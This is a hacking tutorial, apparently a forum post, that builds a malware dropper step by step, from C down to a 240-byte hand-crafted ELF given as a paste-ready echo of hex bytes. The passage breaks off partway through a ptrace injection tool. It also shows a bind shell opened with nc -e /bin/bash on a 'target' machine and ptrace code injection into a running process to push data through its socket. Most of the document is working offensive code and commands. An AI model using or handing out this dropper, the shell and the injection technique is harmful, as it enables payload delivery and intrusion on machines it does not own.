# Programming for Wannabes. Part V. A Dropper

So far we have been much focused on reverse engineering, but everybody knows that in order to become a hacker you have to master much more than that. So in this installment we will be moving forward and making use of all the stuff we had learned till now in order to get started with network programming.

We will start with something very simple but that will allow us to use everything we had already learnt at the same time that we dive into networking. For this purpose we will be writing a dropper.

A dropper is a program, usually very small, so it gets more chances to get transferred to a remote machine and whose goal is to download other files, usually bigger parts of some malware too big to fit as part of an exploit.

This may sound cool to some of you, but we are basically going to write a program to transfer files between two machines. And we will try to make this program very, very small. Hopefully this will throw some light about that question on which language you should use to write malware...

# A simple dropper

Let's start writing our dropper in C. The program is going to be very simple. We will create a TCP connection to some fixed machine and write to `stdout` anything received from that connection.

In order to test the dropper in your machine, you will need two terminals. One will be play the role of the malware server, i.e. the machine containing a full-fledge malware we want to transfer to the compromised machine. For our purpose this will just be:

```bash
malware_server $ cat /usr/bin/xeyes | nc -l -p $((1111))
```

This line simulates a TCP server listening on port `0x1111` that will send the program `xeyes` to any one connecting to it. To test this, open another terminal and run the following command:

```bash
compromised_machine $ rm k; nc localhost $((1111)) > k; chmod +x k; ./k
```

You can try this line and get those fancy eyes up following your mouse on the screen.

So, what we are going to write is a program to do what `nc` does in the example above. Yes, you can use `nc` or similar tools whenever possible, but we are here trying to be wannabees... and for that we need to be able to build any single tool we will every use... that's the difference between script kids and hackers... I think :)

# Minimal C Dropper

So let's take a look to a minimal dropper, and let's use that code to introduce new C language concepts and start our journey. The code is this:

```C
#include <stdio.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUF_SIZE 1024

int main (void) {
  int                s, l;
  unsigned long      addr =  0x0100007f11110002; // Define IP the hacker way :)
  unsigned char      buf[BUF_SIZE];

  
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) return -2;
  if (connect (s, (struct sockaddr*)&addr, 16) < 0)         return -3;
  
  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) <= 0) break;
    write (1, buf, l);
    if (l < BUF_SIZE) break;
  }
  close (s);
  
  return 0;
  
}
```

Not bad. You already know everything about the header files. the `main` function and how to declare basic integer variables of different sizes, so I will not insist on this anymore. The rest of the code only contains stuff you already know, except for the `while` loop. But we will get to it eventually.

So the first thing we find is a call to a function named `socket`. This is actually a system call and in that sense it is not different of the `_exit` or `write` system call we were using in the previous instalments. This just do something different.

The `socket` system call allows us to create a socket. In the same way than a file allows us to use the hard drive (and I know we haven't talked about this yet), a socket is the way the operating system give to us in order to use network interface.

The socket can be of different types. Just like the files that can be text or binary files, sockets also have different types. For now, and in order to keep this simple, we will just care about internet sockets or, being more pro TCP/IP. The first and third parameter we pass to `socket` defines that. The second parameter indicates the type of connection we want. It can be a `STREAM` connection like in this code, or a `DGRAM` _connection_ (actually this is used for connection-less communications). Without going into protocol details, a `SOCK_STREAM` allows us to talk `TCP`, while a SOC_DGRAM` allows us to speak 'UDP'.

Therefore, the first code line in the program creates a path to the network hardware and also tell the operating system that we want to talk to a remote machine over the Internet and using TCP.

_There are other types of Protocol Families and socket types. But for the time being, just pay attention to the second parameter and that will be enough to write a whole bunch of tools_

# Connecting

You may had noted that the type of our socket is `STREAM, so our communication will flow like a stream, but, before we can do that, we need to set where to connect this stream. Using technical jargon, TCP is an connection-oriented protocol, meaning than, before any data can be exchanged a connection needs to be established. Once established we can just write and read data from the socket and that data will go to the right machine automatically.

This is different to the `DGRAM` type where, there is no connection, and for each piece of data we want to send (this is called technically a datagram) we always need to indicate the destination. 

In other words. TCP is like making a phone call and UDP is like sending a letter.

So, we need to make the call, and this is done with the `connect` system call. Yes. This is also a system call so we are still in our comfort zone.

As TCP is a so-called transport protocol it defines the network locations as network addresses and ports. In general a network address identifies a machine and a port a service within that machine. So, we need to specify an IP address and a port. In our case we will be using local host (`127.0.0.1`) and port `0x1111`... the values we used at the very beginning of the text with our `nc` example.

In order to specify this, we would usually make use of a C structure, but we haven't talked about structures yet... Well we can briefly talk about them right now. A structure is a compound data type that allows us to pack together multiple simple datatypes. In general, everything we declare in a structure is stored in memory in sequence, that means that we can always access that memory using different ways.

In our example, we are not using the structure, but if we did, it will look like this:

```
struct ip_addr {
	unsigned short family;
	unsigned short port;
	unsigned char ip[4];
}
```

When using the structure we can access the different fields using the identifier indicated inside the `struct` declaration. In this case, the whole structure is 8 bytes long so it fits in a `long`. And that is what we had done in our program.


     0x0100007f11110002 -> 01    --> 01
                           00    --> 00
	    				   00    --> 00
		    			   7f    --> 127
			    		   1111  --> Port
				    	   0002  --> Address Family



So both things are actually the same thing. However, note that for normal programs (those that are not that cool as this one we are writing right now), you shouldn't do this. Structures are there for good reasons, usually to ensure portability and make your program work with other protocol families, and addresses formats.

Anyway... that long number is all the information we need to connect to our malware server.

The last parameter to `connect` is the length of the structure passed as second parameter. Yes, it is 16 and not 8. The original structure, named `struct sockaddr` has a 8 bytes padding field. The size is required in order to support other protocols, where the machines or services are addressed in a different way and may need more or less space to get stored. Think for instance on Bluetooth where the devices are addressed using is BT address (kind of a MAC address).

So, the `connect` system call does all the TCP magic (send those `SYNC` and `SYNC/ACK` packets you may have heard about) and connects our socket (the one we created using `socket`) with the remote machine we specified in the address. At this point, anything we write in each of the ends of the connection will just get to the other side.

# Save the data

Now we just need to read what the server is sending and drop it somewhere. Instead of opening a file and save the data directly there we had opted to write to `stdout` and let the shell redirection operations do the magic. Exactly as shown at the beginning with `nc`.

The code that does this is repeated here for the readers convenience:

```C
  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) <= 0) break;
    write (1, buf, l);
    if (l < BUF_SIZE) break;
  }

```

This is a `while` loop. Basically it repeats whatever is after the `while (cond)` while the condition is true. In the example above we have set what is known as an infinite loop. As the condition is always true, the block affected by the `while` will repeat forever... Well actually until we leave it with the `break` keyword.

With this information, and making use of our knowledge about the `write` system call from previous instalments, we can easily infer that the `read` system call will read data from the indicated file descriptor (in this case it is a socket so data will be read from the network) and stores it in the indicated buffer. It will try to read as many data as the third parameter specify. As all other system calls, it will return `-1` in case of error. Otherwise `read` returns the number of bytes actually read. So we will be reading data from the network in blocks of `BUF_SIZE` bytes or less until there is nothing left (`read` will return 0 in that case) or an error occurs.

Then, the data we have just read we will write to `stdout` (remember file descriptor 1). The loop will finish whenever we read a block from the network with a size less than the designated buffer size.

Now we can compile our C program and test it using the setup we described earlier in this text.

In one console let's launch the server:

    malware_server $ cat /usr/bin/xeyes | nc -l -p $((0x1111))
	
In other console, let's compile and launch our dropper. I have named it `nwget_basic.c`

    compromised_machine $ make nwget_basic
	compromised_machine $ rm k; ./nwget_basic > k; chmod +x k; ./k
	
If everything goes well, you should see those eyes staring at your mouse pointer

# Shrinking the dropper

Sometimes getting a file into a machine is tricky. This may happen even with non security related scenarios. I have been in those cases were I need to transfer a file into a machine that does not have any tool to transfer files... Once I had `ssh` access to it but no `scp`. In general, if you can get to a shell in the machine there should be some way to get your files also there, but that is not always easy.

In other occasions, you just have a exploit that allows you to run a very small code, or transfer a few bytes. Anyway, in general, the smaller your dropper the better so we are going to shrink it as much as we could. And we already know how to do this, so I will just go quick with this. We will just substitute the system calls for assembly versions and get rid of the libc.

You can find the code in my github and try to recompile it yourself... or even better, you can try to write it based on what we discussed on Part II. Using this technique I manage to get my dropper down to 1.8Kb static binary (that means that I do not depend on any specific library whatsoever).

But we can do way better re-writing it in asm.

# pwget (picoWget)

No, the name is not because of me. It is because the previous one was `nwget` or nanoWget, so we are going smaller this time. `pwget` is the direct asm translation of `nwget` and this is how it looks like:

```nasm
section	.text
global _start

_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -> s (socket)
	;; [rbp + 0x08] -> len (int)
	;; [rbp + 0x10] -> buf (unsigned char)
	;; Create socket
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov  rdi, 2		; PF_INET 2
	mov  rsi, 1		; SOCK_STREAM
	mov  rdx, 6     ; IPPROTO_TCP
	mov  r8, 10 
	call _socket
	mov  [rbp + 0x00], rax	; Store socket in stack
	cmp  rax, 0
	jle  error

	;; connect (s [rbp+0], addr, 16)
	mov  rdi, rax
	lea  rsi, [rel addr]
	mov  rdx, 16
	mov  r8, 20
	call _connect
	test eax, eax
	jl error

l0:	; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	mov rdi, 2
	lea rsi, [rel msg]
	mov rdx, 7
	call _write
	
	mov rdi, r9
	add rdi, r8
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	syscall
	ret
	
_write:
	mov rax, 1
	syscall
	ret
	
_socket:
	mov rax, 41
	syscall
	ret
	
_connect:
	mov rax, 42
	syscall
	ret
	
_close:	mov rax, 3
	syscall
	ret
	
_exit:	mov rax, 60
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db ""ERROR"", 10,0

```


Despite the `jX` instruction everything should look very familiar and easy to understand to you. As I said this is the literal translation of the C program we had just discussed. The `jX` instruction performs jump based on the flag values. Flags get updated by the ALU whenever any logic or arithmetic operation is performer. The flags usually stored in a special register and each flag is a bit of that register. This way when using for instance the instruction `cmp` that allows us to compare two values, the `zero` flag will get activated when both values are equal and the `sign` flag will be activated depending on the result of the substraction of both values.

This way, after running a `cmp` instruction we can jump if the result of the comparison is `less than` with a `jl` or `less than or equal` with a `jle`... It is just that simple. Just look for the conditional jump instructions list for your processor and take a look to the available mnemonics.

This asm, once compiled and `stripped` goes down to 584 bytes. That is quite small.

# Getting rid of everything else

Obviously our code is less than 500 bytes, so the file has still some information there that shouldn't be strictly necessary. If we run it through `readelf` we will see still some remaining information:

```
$ readelf -a pwget
$ readelf -a pget
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400080
  Start of program headers:          64 (bytes into file)
  Start of section headers:          392 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         1
  Size of section headers:           64 (bytes)
  Number of section headers:         3
  Section header string table index: 2

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000400080  00000080
       00000000000000f6  0000000000000000  AX       0     0     16
  [ 2] .shstrtab         STRTAB           0000000000000000  00000176
       0000000000000011  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x0000000000000176 0x0000000000000176  R E    0x200000

 Section to Segment mapping:
  Segment Sections...
   00     .text

There is no dynamic section in this file.

There are no relocations in this file.

The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.

No version information found in this file.

```

We can do better, completely crafting our ELF file. And this will bring us to `fwget1`

# fwget (FemtoWget)

This has already been mentioned in the forum. You can refer to [this](https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7) to see what we are talking about and based on that, we will get something like this:

```
BITS 64
	        org 0x400000
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, ""ELF"", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr


	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

	;;  https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7
_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -> s (socket)
	;; [rbp + 0x08] -> len (int)
	;; [rbp + 0x10] -> buf (unsigned char)
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6              ; IPPROTO_TCP
	call _socket
	
	mov [rbp + 0x00], rax
	cmp rax, 0
	jle error
	

	;; connect (s [rbp+0], addr, 16)
	mov rdi, rax
	;; 	mov rsi, 0x8c0aa8c011110002
	;; 	mov rsi, 0x0100007f11110002
	lea rsi, [rel addr]
	mov rdx, 16
	call _connect
	test eax, eax
	jl error

l0:				; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	;; mov rdi, 2
	;; lea rsi, [rel msg]
	;; mov rdx, 7
	;; call _write
	
	mov rdi, -1
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	jmp _do_syscall
	
_write:
	mov rax, 1
	jmp _do_syscall
	
_socket:
	mov rax, 41
	jmp _do_syscall
	
_connect:
	mov rax, 42
	jmp _do_syscall
	
_close:
	mov rax, 3
	jmp _do_syscall
	
_exit:
	mov rax, 60
	jmp _do_syscall

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db ""ERROR"", 10,0
filesize equ $ - $$

```

The code is identical to `pwget` but we have added the ELF metadata manually and also removed the `.data` section and added the data we need directly on the `.text` segment. When compiled the program goes down to 327 bytes. What is very good.... but we can do better

# Iteration 2

For starters let's remove the error checking for the `socket` system call. Sure it may fail, but that is very unlikely so that is a reasonable risk. We will also store the socket in a register instead of in the stack. We have plenty of registers that we are not using, so let's put them to work. We will use `r8` for this purpose and, therefore all references to `[rbp + 0x00]` will be gone.

We will also use the 32bits version of some registers in some operations. Opcodes involving 32bits registers are shorter. For instance:

    cmp rax, 0  -> 48 83 f8 00
    cmp eax, 0  -> 83 f8 00
	
And also combine this with classical optimisations like using `xor` to set register to zero instead of `mov`

    mov    rdi,0x0   --> 48 c7 c7 00 00 00 00
	     ||
		 \/
    xor    rdi,rdi   --> 48 31 ff
	     ||
		 \/
    xor    edi,edi   --> 31 ff

Using this tricks we made the binary go down to 304 bytes.... but we can do better

# Iteration 3

For iteration 3 we are going to remove unneeded code. Actually it is not unneeded and in the general case is code that has to be there. For this specific case were our objective is to make the program as small as we can, we can overlook this.

We are removing in this iteration:

* Error code check for the `connect` system call... Basically in this case it doesn't matter if the program fails in an ordered way or it just doesn't work. The overall result is the same
* `close` syscall in the socket. All file descriptors are closed automatically by the OS when the process ends, so we can also save that one.

Regarding the code, we optimised the way `rax` is set for the different syscalls. 

     mov rax, 41  -> 48 c7 c0 29 00 00 00
	    ||
		\/
	 xor eax,eax  -> 31 c0
	 add eax,41   -> 83 c0 29

With this changes we have gone down to 273 bytes... But we can do better

# Iteration 4

In the iteration 4 we go even more aggressive. Let's take a look to the changes

First, we reuse the 8 bytes reserved in the ELF header to add the initial code instructions. Something like this:

```
BITS 64
                  org 0x400000
    ehdr:                                                 ; Elf32_Ehdr
                  db      0x7F, ""ELF"", 2, 1, 1, 0         ;   e_ident
  _start: 
                  push rbp                ; 55
                  mov  rbp, rsp           ; 48 89 e5
                  xor esi,esi
                  jmp _start1             ; eb XX

                  dw      2                               ;   e_type
                  dw      0x3e                            ;   e_machin
                  dq      _start                          ;   e_entry

```

As you can see, we can actually use only 6 bytes in the header as the last 2 are needed to jump into the rest of the code

We also removed the exit code... as we do not really care in this case and changed some instructions to use 32bits registers, saving a few bytes.

With this changes we go down to 263 bytes. As you can imagine from this point on, we are just saving a few bytes in each iteration, but let's see how far can we get.

# Iteration 5

If you have been following this series you should be familiar with the concept of stack frame. You may remember that we mentioned how useful it is, but that it is not always needed....Well, this is one of those cases.

So, in this iteration we remove the stack frame of our program. Other than that, we just applied some minor tweaks here and there. This is how the final version looks like

```
BITS 64
;;; ELF header.... we make use of the 8 bytes available in the header
	org 0x400000
BUF_SIZE:	equ 1024
  ehdr:                                                 ; Elf64_Ehdr
                db      0x7F, ""ELF"", 2, 1, 1, 0         ;   e_ident
_start:
  	            xor edi,edi		; 31 ff  - Sets EDI to 0
	            inc edi         ; ff c7  - Sets EDI to 1
	            push rdi		; 57
	            pop  rsi		; 5e     - Sets RSO to 1
	            jmp _start1		; eb XX 


                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr

	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

_start1:
	inc edi                 ; Set EDI to 2
	mov edx, 6              ; IPPROTO_TCP
	
	;; socket (AF_INET=2, SOCK_STREAM = 1, IPPROTO_TCP=6)
	call _socket
	mov ebx, eax		; Store socket on ebx
	;;  It is unlikely that the socket syscall will fail. No check for errors

	;; connect (s [rbp+0], addr, 16)
	mov edi, eax		; Saves 1 byte
	lea rsi, [rel addr]
	add edx,10
	
	call _connect
	;;	Just skip error check... if it fails is not gonna work anyway
	
	lea rsi, [rsp]	 ; Just use the stack as buffer.... we should decrement it
l0:				; Read loop
	;; Read data from socket
	;; _read (s = rbx, buf= [rsp], 1024);

	mov edi, ebx
	mov edx, BUF_SIZE
	call _read
	cmp eax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rsp], rax)
	xor edi,edi
	inc edi			; rdi = 1
	mov edx, eax		; get len from _read
	call _write
	cmp eax, BUF_SIZE
	jl done
	jmp l0
done:
	;;  _close (s)
	;;	File descriptors get closed automatically when the process dies

	;; We do not care about exit code
	call _exit		
	
	;; Syscalls
_read:
	xor eax,eax
	jmp _do_syscall
	
_write:
	xor eax,eax
	inc eax

	jmp _do_syscall
	
_socket:
	;; mov rax, 41
	xor eax,eax
	add al, 41
	jmp _do_syscall
	
_connect:
	;; 	mov rax, 42
	xor eax,eax
	add al, 42
	jmp _do_syscall
	
_close:
	;; mov rax, 3
	xor eax,eax
	add al, 3
	jmp _do_syscall
	
_exit:
	xor eax,eax
	add al, 60

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
filesize equ $ - $$

```

This version is 240 bytes long and it is suitable to be dropped using a single `echo`.

```
echo -n -e ""\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x31\\xff\\xff\\xc7\\x57\\x5e\\xeb\\x68\\x02\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\x08\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xc7\\xba\\x06\\x00\\x00\\x00\\xe8\\x4b\\x00\\x00\\x00\\x89\\xc3\\x89\\xc7\\x48\\x8d\\x35\\x59\\x00\\x00\\x00\\x83\\xc2\\x0a\\xe8\\x3e\\x00\\x00\\x00\\x48\\x8d\\x34\\x24\\x89\\xdf\\xba\\x00\\x04\\x00\\x00\\xe8\\x1e\\x00\\x00\\x00\\x83\\xf8\\x00\\x7e\\x14\\x31\\xff\\xff\\xc7\\x89\\xc2\\xe8\\x12\\x00\\x00\\x00\\x3d\\x00\\x04\\x00\\x00\\x7c\\x02\\xeb\\xdb\\xe8\\x1c\\x00\\x00\\x00\\x31\\xc0\\xeb\\x1c\\x31\\xc0\\xff\\xc0\\xeb\\x16\\x31\\xc0\\x04\\x29\\xeb\\x10\\x31\\xc0\\x04\\x2a\\xeb\\x0a\\x31\\xc0\\x04\\x03\\xeb\\x04\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xc3\\x02\\x00\\x11\\x11\\x7f\\x00\\x00\\x01"" > fwget; chmod +x fwget

```

In other words, it is small enough to be typed manually :). In case some compressor is available on the target machine a few more bytes could be saved, but not much more.


# Final word about the dropper

As you may have noticed, this dropper connects to a hard-coded machine. Be free to add some extra code to process command-line arguments and made this value a parameter (the command-line parameters are passed to `_start` in the stack), but that will just increase the size of our dropper. 

You can easily recompile your dropper with a new IP/Port or just write a small program/script to patch the binary. This I'll leave as an exercise for the reader.

# Dropping a Dropper like a pro

At this point, we are done with this lesson, but as this was a little bit light, let's add a bit of coolness. Yes, sure, we can drop our dropper just pasting the previous `echo` command in our interactive console, or redirecting the file using whatever tool we already use to get into our interactive session. But, let's face it. That is a pretty boring way of doing it.

So, what we are going to do is to attach to the interactive shell program (in this example we will be using `nc`), and drop our commands directly on the open socket to the remote machine. In order to figure out which socket you need to write to, we can check `/proc/PID/fd`. Let's setup our environment.

Suppose we have got access to machine `target` and started a remove shell using `nc.openbsd` (the other one does not have the flag `-e`). Something like this:

    hacker@target $ nc -e /bin/bash -l -p 1234
	
Now, from the hackers machine we can start a remote shell session like this:

    hacker@hackerbox $ nc target 1234
	
At this point, we have a TCP connection to machine `target` going on. If we now get the pid can check the open file descriptors for this process:

    hacker@hackerbox $ ps ax | grep ""nc target"" | head -1
     8095 pts/37   S+     0:00 nc target 1234
	hacker@hackerbox $ ls -l /proc/8095/fd
	total 0
	lrwx------ 1 pico pico 64 Sep 12 11:25 0 -> /dev/pts/37
	lrwx------ 1 pico pico 64 Sep 12 11:25 1 -> /dev/pts/37
	lrwx------ 1 pico pico 64 Sep 12 11:25 2 -> /dev/pts/37
	lr-x------ 1 pico pico 64 Sep 12 11:25 3 -> 'pipe:[45281146]'
	l-wx------ 1 pico pico 64 Sep 12 11:25 4 -> 'pipe:[45281146]'
	lrwx------ 1 pico pico 64 Sep 12 11:25 5 -> 'socket:[60870195]'

	
Here we can see the three first file descriptors associated to the pseudoterminal, namely: `stdin`, `stdout` and `stderr`. Then a `pipe` what I'm not sure why it is created for, but it would be a nice exercise to check it out.

Finally, we can see that file descriptor 5 is our socket... So now we know where to write our stuff.

# Attaching to the process. Meeting `ptrace`

It is time to start writing our cool tool. It will attach to any process as a debugger and write some data to a given file descriptor within that process. The way to achieve this is using the system call `ptrace`.

Again, the program may look complex at first glance, but it is just a basic sequence of system calls being executed sequentially... Actually it is just one single system call (`ptrace`) being executed with different parameters.

I will not put all the code here. You can find it on my [github repository](https://github.com/0x00pf/0x00sec_code). Here I will just include the relevant parts of the program.

So, the first thing we have to do, as indicated before is to get attached to the indicated process:

```C
  _pid = atoi (argv[1]);

  printf (""+ Attaching to process %ld\n"", _pid);
  if ((ptrace (PTRACE_ATTACH, _pid, NULL, NULL)) < 0)
    perror (""ptrace_attach:"");
  
  printf (""%s"", "" ..... Waiting for process...\n"");
  wait (&status);
```
The `atoi` function at the beginning allows us to convert a string (`Ascii`) to an number (`Integer`)(`AsciiTOInteger` -> `atoi`). Yes, we are passing the `pid` to attach to as a parameter to our program. Then we just find the `ptrace` system call being invoked with the _request_ `PTRACE_ATTACH` that allows us to get attached to the process indicated by the second parameter. Parameters 3 and 4 are not used for this request.

After issuing this request, we need to wait for the process to stop and give us back the control. This we do using the system call `wait`.

At this point we have full access to the process and we can do whatever we want with it.

_Note: You need to have enough permissions to be able to attach to a running process_

# Preparing code injection

Now we have to do some tasks to be able to execute some code from within the process being controlled. The first thing we do is to retrieve the current registers values. We will be using these values to run our code but also, we want to restore everything to the previous state when we are done, so our remote shell session continues working normally.

```
  if ((ptrace (PTRACE_GETREGS, _pid, 0, &regs)) < 0) 
      perror (""ptrace_get_regs:"");
  memcpy (&regs_cpy, &regs, sizeof (struct user_regs_struct));
```

Pretty straight forward isn't it?. After getting the registers we made a copy that we will be using during the clean-up to get everything as it was before we break into the process.

The other thing we have to do is to save the current instruction being executed. Ok, this looks like a good time to further explain what we are going to do.

In order to write into a file descriptor, we have to issue the `write` system call. As we know, to run a system call we just need to set our registers and then run the `syscall` instruction. We can deal with the registers separately using the `PTRACE_GETREGS` (yes, sure, there is a `PTRACE_SETREGS` also, so we are done there), but we need to run the `syscall` instruction. For doing that we have 2 options:

* We scan the memory looking for the instruction and set `RIP` to point there so when we re-start the process that instruction get executed...
* Or we just insert the `syscall` instruction at whatever place. In that case, we need to store the previous value at that position, in order to restore it once our system call has been executed.

We chose the second option, so we need to get the current opcode and overwrite it:

```
 if ((opcode = ptrace (PTRACE_PEEKTEXT, _pid, regs.rip, 0)) < 0)
    perror (""retrieve opcode:"");
(...)
  ptrace (PTRACE_POKETEXT, _pid, regs.rip, 0x050f050f050f050f);
	
```
	
Also pretty straightforward. We use `PTRACE_PEEKTEXT` to read the current opcode (the one `RIP` is pointing to, and then we inject our `syscall` instruction (`0x05 0x0f`). To be honest I didn't bother to figure out, if the opcodes should be in the lower part of the long or in the high.... I just filled the whole 8 bytes with the opcode to be sure. Anyways, `ptrace` will write the 8 bytes...

# Allocating a buffer and filling it

We are almost ready to run our `write` system call. We just need a buffer to hold the data we want to send through the socket.

Again, we can do this in many different ways:

* We can overwrite part of the `text` segment with our data and then restore it as we have done with the opcode in the previous section.
* Doing something similar on the `data` segment
* Actually allocate memory using `brk` and then release it
* Or just use the stack

So, we went for the last option as it was the simplest. We just make some room in the `stack` to be sure we do not overwrite any previous data in there when we write our data. We do not need to do anything else, at the end of the process, when we restore the original register values, the stack pointer will go back to the right position and all the memory we used will immediately be recover.

We wrote a simple function to poke arbitrary strings in the stack. The function looks like this:

```
int cpy_str (pid_t _pid, char *str, unsigned long long int *p) {
  int                     i;
  int                     len = strlen (str);
  int                     len1 = (len / 8) + 1;
  char                   *aux = malloc (len1 * 8);
  unsigned long long int *d = (unsigned long long int*)aux;

  printf (""!! Reallocating %d to %d bytes\n"", len, len1);
  memset (aux, 0, len1);
  strcpy (d, str);
  
  for (i = 0; i < len1 + 1; i++)    {
      if ((ptrace (PTRACE_POKEDATA, _pid, p, *d)) < 0) perror (""POKE Stack:"");
      p++; d++;
    }
	
  free (aux);
  return len;
}
```

The function just copies a given string into a given address. But as we have to do this in blocks of 8 bytes, I have just reallocated a new buffer adjusted to 8 bytes boundary and used it, instead of having extra checks in the loop.

The `for` loop in the code above is like a compressed form of `while` loop.

```
for (i = 0; i < len1; i++) { (...) }
```

is equivalent to

```
i = 0;
while (i < len1) {
  (...)
  i++;
}
```

Function `memset` and `strcpy` allow us to initialise a given memory region with a value or copy a memory buffer into another. `strcpy` work on C strings that are delimited by a tailing `\0`. In this case that is fine for us, otherwise we should determine the size ourselves and use `memcpy` instead.

# Sending the data

Now, everything is setup to send our data through the socket we had already identified. We had overwrite the current instruction to become a `syscall`. We have our buffer in the stack. So, now we just need to set our registers up and let the process continue execution.

```
     regs.rax = 1;        // Write syscall
     regs.rdi = 5;        // socket (the one we identified at /proc/PID/fd
     regs.rsi = regs.rsp; // Buf in the stack
     regs.rdx= slen;      // Len of buffer to write
